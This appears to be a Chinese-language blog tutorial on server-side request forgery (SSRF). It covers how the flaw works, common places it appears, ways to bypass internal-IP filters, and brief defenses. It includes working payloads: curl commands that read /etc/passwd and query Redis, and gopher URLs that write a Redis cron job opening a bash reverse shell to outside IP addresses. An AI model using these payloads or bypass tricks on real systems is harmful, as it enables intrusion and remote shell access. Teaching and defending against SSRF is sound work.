---
layout: post
title:  web 安全系列-08-SSRF 服务端请求伪造
date:  2020-08-09 10:37:20 +0800
categories: [web]
tags: [web, web-safe, sf]
published: true
---

# SSRF 是什么？

服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。

SSRF攻击通常针对外部网络无法直接访问的内部系统。

## 原理

很多web应用都提供了从其他的服务器上获取数据的功能。

使用指定的URL，web应用便可以获取图片，下载文件，读取文件内容等。

SSRF的实质是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。

一般情况下， SSRF攻击的目标是外网无法访问的内部系统，黑客可以利用SSRF漏洞获取内部系统的一些信息（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。

SSRF形成的原因大都是由于**服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制**。

## 主要攻击方式

攻击者想要访问主机B上的服务，但是由于存在防火墙或者主机B是属于内网主机等原因导致攻击者无法直接访问主机B。

而服务器A存在SSRF漏洞，这时攻击者可以借助服务器A来发起SSRF攻击，通过服务器A向主机B发起请求，从而获取主机B的一些信息。

![输入图片说明](https://images.gitee.com/uploads/images/2020/0809/211849_71a2b9a9_508704.png)

## 漏洞危害

SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。

内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。

#  利用方式

SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式。

以curl为例, 可以使用dict协议操作Redis、file协议读文件、gopher协议反弹Shell等功能，常见的Payload如下：

```
curl -vvv 'dict://127.0.0.1:6379/info'

curl -vvv 'file:///etc/passwd'

# * 注意: 链接使用单引号，避免$变量问题

curl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/103.21.140.84/6789 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'
```

# 过滤绕过

## 更改IP地址写法

一些开发者会通过对传过来的URL参数进行正则匹配的方式来过滤掉内网IP，如采用如下正则表达式：

```
^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$
^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$
^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$
```

对于这种过滤我们采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址可以被改写成：

```
8进制格式：0300.0250.0.1
16进制格式：0xC0.0xA8.0.1
10进制整数格式：3232235521
16进制整数格式：0xC0A80001
合并后两位：1.1.278 / 1.1.755
合并后三位：1.278 / 1.755 / 3.14159267
```

另外IP中的每一位，各个进制可以混用。

访问改写后的IP地址时，Apache会报400 Bad Request，但Nginx、MySQL等其他服务仍能正常工作。

另外，0.0.0.0这个IP可以直接访问到本地，也通常被正则过滤遗漏。

## 使用解析到内网的域名

如果服务端没有先解析IP再过滤内网地址，我们就可以使用localhost等解析到内网的域名。

另外 xip.io 提供了一个方便的服务，这个网站的子域名会解析到对应的IP，例如192.168.0.1.xip.io，解析到192.168.0.1。

## 利用解析URL所出现的问题

在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。

这时候可能会出现对URL参数解析不当，导致可以绕过过滤。

比如 http://www.baidu.com@192.168.0.1/ 当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是www.baidu.com，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为www.baidu.com，而实际上这个URL所请求的内容都是192.168.0.1上的内容。

## 利用跳转

如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用跳转的方式来进行绕过。

可以使用如 http://httpbin.org/redirect-to?url=http://192.168.0.1 等服务跳转，但是由于URL中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，可以通过短地址的方式来绕过。

常用的跳转有302跳转和307跳转，区别在于307跳转会转发POST请求中的数据等，但是302跳转不会。

## 通过各种非HTTP协议

如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用。

比如通过gopher，可以在一个url参数中构造POST或者GET请求，从而达到攻击内网应用的目的。

例如可以使用gopher协议对与内网的Redis服务进行攻击，可以使用如下的URL：

```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1* * * * bash -i >& /dev/tcp/172.19.23.228/23330>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```

除了gopher协议，File协议也是SSRF中常用的协议，该协议主要用于访问本地计算机中的文件，我们可以通过类似 file:///path/to/file 这种格式来访问计算机本地文件。

使用file协议可以避免服务端程序对于所访问的IP进行的过滤。

例如我们可以通过 file:///d:/1.txt 来访问D盘中1.txt的内容。

## DNS Rebinding

一个常用的防护思路是：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就禁止该次请求。

但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，可以进行DNS重绑定攻击。

要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：

服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP

对于获得的IP进行判断，发现为非黑名单IP，则通过验证

服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。

由于已经绕过验证，所以服务器端返回访问内网资源的结果。

## 利用IPv6

有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如 `[::] 0000::1` 或IPv6的内网域名来绕过过滤。

## 利用IDN

一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。

在这些字符中，部分字符会在访问时做一个等价转换，例如 ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ 和 example.com 等同。利用这种方式，可以用 ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ 等字符绕过内网限制。

# 可能的利用点

## 出现的场景

1.社交分享功能：获取超链接的标题等内容进行显示

2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览

3.在线翻译：给网址翻译对应网页的内容

4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片

5.图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验

6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试

7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作

8.数据库内置功能：数据库的比如mongodb的copyDatabase函数

9.邮件系统：比如接收邮件服务器地址

10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等

11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞

一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……

12.从远程服务器请求资源（upload from url 如discuz！；import & expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）

## 内网服务

- Apache Hadoop远程命令执行

- axis2-admin部署Server命令执行

- Confluence SSRF

- counchdb WEB API远程命令执行

- dict

- docker API远程命令执行

- Elasticsearch引擎Groovy脚本命令执行

- ftp / ftps（FTP爆破）

- glassfish任意文件读取和war文件部署间接命令执行

- gopher

- HFS远程命令执行

- http、https

- imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码）

- Java调试接口命令执行

- JBOSS远程Invoker war命令执行

- Jenkins Scripts接口命令执行

- ldap

- mongodb

- php_fpm/fastcgi 命令执行

- rtsp - smb/smbs（连接SMB）

- sftp

- ShellShock 命令执行

- Struts2 命令执行

- telnet

- tftp（UDP协议扩展）

- tomcat命令执行

- WebDav PUT上传任意文件

- WebSphere Admin可部署war间接命令执行

- zentoPMS远程命令执行

## Redis利用

- 写ssh公钥

- 写crontab

- 写WebShell

- Windows写启动项

- 主从复制加载 .so 文件

- 主从复制写无损文件

## 云主机

在AWS、Google等云环境下，通过访问云环境的元数据API或管理API，在部分情况下可以实现敏感信息等效果。

# 防御方式

过滤返回的信息

统一错误信息

限制请求的端口

禁止不常用的协议

对DNS Rebinding，考虑使用DNS缓存或者Host白名单

# 拓展阅读 

[web 安全系列](https://houbb.github.io/2020/08/09/web-safe-00-overview)

# 参考资料

[SSRF](https://websec.readthedocs.io/zh/latest/vuln/ssrf.html)

[wiki-服务器端请求伪造](https://zh.wikipedia.org/wiki/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)

[了解SSRF,这一篇就足够了](https://xz.aliyun.com/t/2115)

[浅析SSRF原理及利用方式](https://www.anquanke.com/post/id/145519)

[SSRF漏洞攻击原理及防御方案](https://zhuanlan.zhihu.com/p/91819069)

* any list
{:toc}